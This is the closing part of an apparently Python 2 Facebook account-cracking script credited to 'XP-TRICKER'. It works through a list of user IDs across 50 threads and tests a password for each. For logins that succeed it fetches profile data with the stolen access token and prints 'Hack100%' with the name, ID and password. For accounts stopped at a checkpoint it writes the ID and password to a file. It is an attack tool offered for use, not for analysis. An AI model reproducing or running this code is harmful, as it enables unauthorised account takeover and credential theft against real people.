										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)	

																	

															

		except:

			pass

		

	p = ThreadPool(50)

	p.map(main, id)

	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"

	print "  \033[1;93m⊱•─── Developed By XP-TRICKER─── •⊰" #Dev:XP-TRICKER

	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 XP.py)↩\033[1;97m....'

	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))

	print """

\033[1;32m  ●▬▬▬▬๑۩۩๑▬▬▬▬▬●

▀█▀▐░░░░░░░░▐░░░░░░░░░░░░░░

░█░▐▀█░▀█▐▀█▐▐▀▐░█▐▀█▐░█░░░

░█░▐░█▐▀█▐░█▐▌░▐▄█▐░█▐░█░░░

░█░▐░█▐▄█▐░█▐▐▄▄▄█▐▄█▐▄█░░░ FOR  USING MY TOOL

\033[1;32m  ●▬▬▬▬๑۩۩๑▬▬▬▬▬●

\033[1;94m┏┓┏┓┊┊┊┊┊┊┊┊┊┊┊┊

\033[1;94m┃┗┛┣━━┳━━┳━━┳┓┏┓

\033[1;92m┃┛┗┃╭╮┃┛┛┃┗┗┃╰┛┃

\033[1;92m┃╰╯┃┗┛┃╰╯┃╰╯┣━╮┃

\033[1;96m┃┏┓┃┏┓┃┏━┫┏┳┻━╯┃

\033[1;96m┗┛┗┻┛┗┻┛┊┗┛┗━━━╯

Checkpoint ID Open After 7 Days

 Having Problem Whatsapp Me :NOT USING✯☠"""

	

	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")

	menu()

if __name__ == '__main__':

	login()
